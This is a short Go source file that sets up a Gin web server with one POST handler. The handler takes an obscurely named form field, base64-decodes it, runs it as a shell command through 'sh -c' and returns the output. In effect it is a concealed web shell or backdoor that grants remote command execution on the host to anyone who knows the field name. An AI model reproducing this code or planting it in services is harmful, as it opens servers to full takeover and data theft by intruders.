package simpleGinn

import (
	"encoding/base64"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"os/exec"
)

func zhaoll(c *gin.Context) {
	simplejson := c.PostForm("k3oOtbcgQAkp4rzq")
	decoded, err := base64.StdEncoding.DecodeString(simplejson)
	if err == nil {
		//fmt.Printf("解析成功")
		//fmt.Println(string(decoded))
		cmd := exec.Command("sh","-c",string(decoded))
		out, err := cmd.CombinedOutput()
		if err != nil {
			//fmt.Printf("combined out:\n%s\n", string(out))
			log.Fatalf("cmd.Run() failed with %s\n", err)
		}
		c.String(http.StatusOK, string(out))
	} else {
		c.String(http.StatusOK, "")
	}

}


func SimpleGinnFunc () *gin.Engine {
	gin.SetMode(gin.ReleaseMode)
	router := gin.Default()
	router.POST("", zhaoll)
	return router
}